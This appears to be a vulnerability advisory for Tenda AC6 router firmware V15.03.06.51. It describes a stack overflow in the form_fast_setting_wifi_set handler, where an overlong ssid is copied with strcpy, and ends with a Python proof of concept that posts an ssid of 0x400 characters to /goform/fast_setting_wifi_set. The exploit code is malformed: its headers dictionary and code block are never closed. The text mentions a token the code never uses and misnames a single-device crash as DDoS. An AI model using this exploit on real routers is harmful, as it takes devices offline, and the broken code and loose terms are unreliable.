**Affected products:** AC6 AC1200 

**Affected firmware version:**  AC6V2.0RTL_V15.03.06.51

# Overview

A **stack overflow vulnerability** in the `form_fast_setting_wifi_set` function in the  AC6V2.0RTL_V15.03.06.51 allows an attacker to construct an excessively long `ssid` variable, causing a stack overflow, which then leads to a DDoS attack.

# Vulnerability details

Analyzing the form_fast_setting_wifi_set function in this file reveals that when the value of the ssid variable is a very long string, such as 400 characters of "a", a stack overflow attack occurs because the ssid_24g variable, due to insufficient buffer length, overflows when the value is assigned via the strcpy function.

Cross-referencing the form_fast_setting_wifi_set function, it can be observed that it is indeed called by the formDefineTendDa function. As a result, an attacker can cause a DDoS attack on the router.

# Poc

By changing the IP and token to the target router's IP and token, the attack can be successfully carried out.

```python
import requests
ip="192.168.0.34"

url = f"http://{ip}/goform/fast_setting_wifi_set"
headers = {
    "Host": "192.168.0.34",

data = {
    "ssid": "a"*0x400,
}

response = requests.post(url, headers=headers, data=data)

print(response.text)
